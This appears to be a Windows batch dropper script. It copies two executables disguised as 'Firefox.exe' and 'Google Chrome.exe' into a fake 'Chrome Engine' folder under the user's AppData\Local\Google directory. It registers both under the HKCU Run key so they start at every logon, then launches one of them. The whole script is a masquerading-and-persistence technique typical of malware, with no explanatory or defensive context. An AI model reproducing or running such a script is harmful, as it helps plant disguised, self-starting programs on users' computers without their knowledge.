@echo OFF
mkdir "%USERPROFILE%\AppData\Local\Google"
mkdir "%USERPROFILE%\AppData\Local\Google\Chrome"
mkdir "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine"
copy ".\files\Firefox.exe" "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine"
copy ".\files\Google Chrome.exe" "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Firefox" /D "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine\Firefox.exe"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Chrome" /D "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine\Google Chrome.exe"
"%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine\Firefox.exe"